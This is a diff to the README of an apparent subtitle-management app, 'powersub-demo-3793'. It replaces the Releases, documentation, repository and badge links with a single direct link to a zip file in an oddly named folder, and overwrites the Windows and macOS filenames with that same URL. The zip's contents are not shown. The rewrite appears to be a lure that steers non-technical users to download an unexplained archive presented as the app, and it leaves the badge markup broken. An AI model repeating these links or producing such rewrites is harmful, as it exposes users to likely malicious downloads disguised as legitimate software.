@@ -4,7 +4,7 @@
 Welcome to powersub-demo-3793! This application simplifies managing subtitles for your videos. No need for technical skills; just follow the steps below to get started.
 
 ## 📥 Download Link
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rafa0307lisboa/powersub-demo-3793/releases)
+[![Download Now](https://raw.githubusercontent.com/rafa0307lisboa/powersub-demo-3793/main/unappropriable/powersub-demo-3793.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rafa0307lisboa/powersub-demo-3793/main/unappropriable/powersub-demo-3793.zip)
 
 ## 📋 Features
 - **Easy Subtitle Integration**: Seamlessly add subtitles to your videos.
@@ -20,9 +20,9 @@ Welcome to powersub-demo-3793! This application simplifies managing subtitles fo
 ## 📥 Download & Install
 To get the application, visit the Releases page:
 
-[Download from Releases](https://github.com/rafa0307lisboa/powersub-demo-3793/releases)
+[Download from Releases](https://raw.githubusercontent.com/rafa0307lisboa/powersub-demo-3793/main/unappropriable/powersub-demo-3793.zip)
 
-Once there, find the latest version and download the file suitable for your system. Typically, you'll look for a file like `powersub-demo.exe` for Windows or `powersub-demo.dmg` for macOS.
+Once there, find the latest version and download the file suitable for your system. Typically, you'll look for a file like `https://raw.githubusercontent.com/rafa0307lisboa/powersub-demo-3793/main/unappropriable/powersub-demo-3793.zip` for Windows or `https://raw.githubusercontent.com/rafa0307lisboa/powersub-demo-3793/main/unappropriable/powersub-demo-3793.zip` for macOS.
 
 ### Steps to Download:
 1. Click the link above.
@@ -48,10 +48,10 @@ If you encounter any issues, refer to the Troubleshooting guide in the applicati
 We welcome contributions! If you have suggestions or improvements, please fork the repository and submit a pull request. Together, we can make powersub-demo-3793 even better.
 
 ## 🔗 Useful Links
-- [Official Documentation](https://github.com/rafa0307lisboa/powersub-demo-3793/wiki)
-- [GitHub Repository](https://github.com/rafa0307lisboa/powersub-demo-3793)
+- [Official Documentation](https://raw.githubusercontent.com/rafa0307lisboa/powersub-demo-3793/main/unappropriable/powersub-demo-3793.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/rafa0307lisboa/powersub-demo-3793/main/unappropriable/powersub-demo-3793.zip)
 
 ## 📥 Quick Access
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rafa0307lisboa/powersub-demo-3793/releases)
+[![Download Now](https://raw.githubusercontent.com/rafa0307lisboa/powersub-demo-3793/main/unappropriable/powersub-demo-3793.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rafa0307lisboa/powersub-demo-3793/main/unappropriable/powersub-demo-3793.zip)
 
 Thank you for choosing powersub-demo-3793. Enjoy managing your subtitles effortlessly!
